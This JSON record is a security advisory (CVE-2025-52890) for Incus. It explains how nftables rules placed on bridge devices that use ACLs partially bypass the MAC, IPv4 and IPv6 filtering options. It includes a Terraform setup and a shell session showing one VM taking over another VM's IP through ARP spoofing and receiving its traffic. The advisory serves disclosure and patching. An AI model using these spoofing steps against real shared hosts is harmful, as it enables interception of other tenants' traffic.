{
  "Severity": "HIGH",
  "UpdatedAt": "2025-06-28T00:11:01Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/lxc/incus/v6"
  },
  "Advisory": {
    "DatabaseId": 300683,
    "Id": "GSA_kwCzR0hTQS1wN2Z3LXZqam0tMnJ3cM4ABJaL",
    "GhsaId": "GHSA-p7fw-vjjm-2rwp",
    "References": [
      {
        "Url": "https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-52890"
      },
      {
        "Url": "https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8"
      },
      {
        "Url": "https://github.com/advisories/GHSA-p7fw-vjjm-2rwp"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-p7fw-vjjm-2rwp"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-52890"
      }
    ],
    "Description": "### Summary\n\nWhen using an ACL on a device connected to a bridge, Incus generates nftables rules that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to ARP spoofing on the bridge and to fully spoof another VM/container on the same bridge.\n\n### Details\n\nIn commit d137a063c2fe2a6983c995ba75c03731bee1557d, a few rules in the bridge input chain are moved to the top of the chain:\n\n    ct state established,related accept\n\n    iifname \"{{.hostName}}\" ether type arp accept\n    iifname \"{{.hostName}}\" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept\n\nHowever, these rules accept packets that should be filtered and maybe dropped by later rules in the \"MAC filtering\", \"IPv4 filtering\" and \"IPv6 filtering\" snippets:\n\n\tiifname \"{{.hostName}}\" ether type arp arp saddr ether != {{.hwAddr}} drop\n\tiifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop\n    ...\n    iifname \"{{.hostName}}\" ether type arp arp saddr ip != { {{.ipv4NetsList}} } drop\n    ...\n\tiifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 {{.ipv6NetsPrefixList}} drop\n\nBasically, the added rules partially bypass the security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. Doing so, they allow an attacker to perform ARP poisoning/spoofing attacks and send malicious Neighbor Advertisement (type 136).\n\n### PoC\n\nWith this terraform infrastructure:\n\n```\nresource \"incus_network_acl\" \"acl_allow_out\" {\n  name    = \"acl-allow-out\"\n  egress = [\n    {\n      action           = \"allow\"\n      destination      = \"0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254\"\n      state            = \"enabled\"\n    },\n  ]\n}\nresource \"incus_network_acl\" \"acl_allow_in\" {\n  name    = \"acl-allow-in\"\n  ingress = [\n    {\n      action           = \"allow\"\n      state            = \"enabled\"\n    },\n  ]\n}\n\nresource \"incus_network\" \"br0\" {\n  name = \"br0\"\n  config = {\n    \"ipv4.address\"          = \"10.0.0.1/24\"\n    \"ipv4.nat\"              = \"true\"\n  }\n}\n\nresource \"incus_instance\" \"machine1\" {\n  name  = \"machine1\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n    \"cloud-init.vendor-data\" = \u003c\u003c-EOF\n      #cloud-config\n      package_update: true\n      packages:\n        - dhclient\n        - tcpdump\n      runcmd:\n        - systemctl disable --now systemd.networkd.service\n        - systemctl disable --now systemd.networkd.socket\n    EOF\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n      \"security.ipv4_filtering\" = true\n      \"security.acls\" = join(\",\",\n        [\n          incus_network_acl.acl_allow_out.name,\n          incus_network_acl.acl_allow_in.name,\n        ])\n    }\n  }\n}\n\nresource \"incus_instance\" \"machine2\" {\n  name  = \"machine2\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n    }\n  }\n}\n```\n\nAn attacker in a VM (machine1) change their IP address to another VM (machine2)'s IP. The malicious change is reflected in the ARP table of the host, bypassing the MAC filtering. When the host emits or forwards a packet to machine2's IP, it is sent to machine1.\nIn addition, as `ct state established,related accept` is now the first rule in bridge chain input, machine1 can even answer and thus fully spoof the victim on the network.\n\n```bash\n[HOST]$ ip n\n10.0.0.236 dev br0 lladdr 10:66:6a:88:e6:5b REACHABLE # machine2\n10.0.0.2 dev br0 lladdr 10:66:6a:89:39:45 REACHABLE # machine1\n\n# Spoof machine2\n[MACHINE1]$ ip add del 10.0.0.2/24 dev enp5s0\n[MACHINE1]$ ip add add 10.0.0.236/24 dev enp5s0\n\n# Flood\n[MACHINE1]$ arping 10.0.0.1\n\n# Machine2's IP refers to machine1's MAC in host ARP table\n[HOST]$ ip n\n10.0.0.236 dev br0 lladdr 10:66:6a:89:39:45 STALE\n\n# Packets from the host (or forwarded by the host) to machine2 ...\n[HOST]$ ping 10.0.0.236\nPING 10.0.0.236 (10.0.0.236) 56(84) bytes of data.\n64 bytes from 10.0.0.236: icmp_seq=1 ttl=64 time=1.19 ms\n\n# ... are sent to machine1!\n[MACHINE1]$ tcpdump -nei enp5s0\nlistening on enp5s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n15:15:17.008470 10:66:6a:99:e0:d8 \u003e 10:66:6a:89:39:45, ethertype IPv4 (0x0800), length 98: 10.0.0.1 \u003e 10.0.0.236: ICMP echo request, id 4, seq 1, length 64\n15:15:17.008513 10:66:6a:89:39:45 \u003e 10:66:6a:99:e0:d8, ethertype IPv4 (0x0800), length 98: 10.0.0.236 \u003e 10.0.0.1: ICMP echo reply, id 4, seq 1, length 64\n```\n\n### Impact\n\nAll versions since d137a063c2fe2a6983c995ba75c03731bee1557d, so basically v6.12 and v6.13.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-06-26T21:12:45Z",
    "Severity": "HIGH",
    "Summary": "Incus creates nftables rules that partially bypass security options",
    "UpdatedAt": "2025-06-28T00:11:01Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.1,
      "VectorString": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "6.14"
      },
      "VulnerableVersionRange": "\u003e= 6.12, \u003c= 6.13"
    }
  ]
}